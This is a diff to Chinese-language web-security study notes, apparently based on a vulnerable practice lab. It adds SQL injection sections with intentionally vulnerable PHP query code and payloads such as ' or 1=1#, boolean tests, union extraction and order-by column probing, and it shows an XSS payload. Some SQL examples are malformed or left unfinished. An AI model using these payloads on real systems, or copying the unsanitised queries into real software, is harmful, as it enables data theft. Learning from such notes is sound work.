@@ -23,6 +23,10 @@
     - [sql注入](#sql%E6%B3%A8%E5%85%A5)
         - [数字型注入](#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5)
         - [字符型注入](#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5)
+        - [搜索型注入](#%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5)
+        - [xx型注入](#xx%E5%9E%8B%E6%B3%A8%E5%85%A5)
+        - [案例1-基于union的信息获取](#%E6%A1%88%E4%BE%8B1-%E5%9F%BA%E4%BA%8Eunion%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96)
+        - [mysql相关知识](#mysql%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86)
     - [相关链接](#%E7%9B%B8%E5%85%B3%E9%93%BE%E6%8E%A5)
 
 <!-- /TOC -->
@@ -225,18 +229,160 @@ payload：#' onclick="alert('xss')"/>
 在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。
 
 ### 数字型注入
+```php
+//后台源码
+if(isset($_POST['submit']) && $_POST['id']!=null){
+    //这里没有做任何处理，直接拼到select里面去了,形成Sql注入
+    $id=$_POST['id'];
+    $query="select username,email from member where id=$id";
+    $result=execute($link, $query);
+    //这里如果用==1,会严格一点
+    if(mysqli_num_rows($result)>=1){
+        while($data=mysqli_fetch_assoc($result)){
+            $username=$data['username'];
+            $email=$data['email'];
+            $html.="<p class='notice'>hello,{$username} <br />your email is: {$email}</p>";
+        }
+    }else{
+        $html.="<p class='notice'>您输入的user id不存在，请重新输入！</p>";
+    }
+}
+```
 ```sql
---mysql, 前半句可以正常查询出一条记录，如果取消注释查询所有记录。
+--正常查询出一条记录
 select eamil where user_id = 1 --or 1=1; 
+--注入，查询所有记录
+select eamil where user_id = 1 or 1 = 1；
 ```
 
 ### 字符型注入
+```php
+//后台源码
+if(isset($_GET['submit']) && $_GET['name']!=null){
+    //这里没有做任何处理，直接拼到select里面去了
+    $name=$_GET['name'];
+    //这里的变量是字符型，需要考虑闭合
+    $query="select id,email from member where username='$name'";
+    $result=execute($link, $query);
+    if(mysqli_num_rows($result)>=1){
+        while($data=mysqli_fetch_assoc($result)){
+            $id=$data['id'];
+            $email=$data['email'];
+            $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";
+        }
+    }else{
+
+        $html.="<p class='notice'>您输入的username不存在，请重新输入！</p>";
+    }
+}
+```
 ```sql
-select email where username = 'kobe';-- kobe' or 1=1#
---在url中构造闭合
-select email where username = 'kobe' or 1=1#'
+--正常情况
+select email from user where username = 'kobe';-- kobe' or 1=1#
+--在url中构造闭合，注入
+select email from user where username = 'kobe' or 1=1#'
 ```
 
+### 搜索型注入
+```php
+//后台源码
+if(isset($_GET['submit']) && $_GET['name']!=null){
+
+    //这里没有做任何处理，直接拼到select里面去了
+    $name=$_GET['name'];
+
+    //这里的变量是模糊匹配，需要考虑闭合
+    $query="select username,id,email from member where username like '%$name%'";
+    $result=execute($link, $query);
+    if(mysqli_num_rows($result)>=1){
+        //彩蛋:这里还有个xss
+        $html2.="<p class='notice'>用户名中含有{$_GET['name']}的结果如下：<br />";
+        while($data=mysqli_fetch_assoc($result)){
+            $uname=$data['username'];
+            $id=$data['id'];
+            $email=$data['email'];
+            $html1.="<p class='notice'>username：{$uname}<br />uid:{$id} <br />email is: {$email}</p>";
+        }
+    }else{
+
+        $html1.="<p class='notice'>0o。..没有搜索到你输入的信息！</p>";
+    }
+}
+```
+
+```sql
+--正常情况
+select email from user where username like '%k%'; --k%' or 1=1#
+--构造闭合，注入
+select email from user where username like '%k%' or 1=1#%';
+
+```
+
+### xx型注入
+```php
+//后台源码
+if(isset($_GET['submit']) && $_GET['name']!=null){
+    //这里没有做任何处理，直接拼到select里面去了
+    $name=$_GET['name'];
+    //这里的变量是字符型，需要考虑闭合
+    $query="select id,email from member where username=('$name')";
+    $result=execute($link, $query);
+    if(mysqli_num_rows($result)>=1){
+        while($data=mysqli_fetch_assoc($result)){
+            $id=$data['id'];
+            $email=$data['email'];
+            $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";
+        }
+    }else{
+
+        $html.="<p class='notice'>您输入的username不存在，请重新输入！</p>";
+    }
+}
+
+```
+
+```sql
+--正常情况
+select email from user where username = kobe;
+--构造闭合，注入
+select email from user where username = 'kobe') or 1=1#;
+```
+
+```sql
+--通过一个输入，查看返回结果，并判断输入是否参与后台的sql语句中
+---如果1正常输出，2不能正常输出，说明拼接成功，存在sql漏洞
+kobe' and 1=1#;
+kobe' and 1=2#;
+
+--单个字符的测试，如'或者"，欺骗后天数据库报错
+```
+总结：闭合测试，构造sql，欺骗后台执行
+
+>小知识：MySQ有三种注释，``#`` ``--`` ``/**/``
+
+### 案例1-基于union的信息获取
+```sql
+--union用法，前后字段数一致
+select email from user where id = 1 union select 字段1 from 表名 where 条件;
+
+select 
+
+
+
+```
+### mysql相关知识
+```sql
+select database();--获取当前数据库名称
+select user();--当前用户权限
+select version();--当前数据库版本
+
+--查询表中有几个字段
+---使用第一列进行排序，如果第一列存在，则可以正常输出，否则错误
+select id from user where username = 'kobe' order by 1;
+
+```
+
+mysql自带一个数据库information_schema，这个表非常重要，里面有很多信息。
 
 
 ## 相关链接
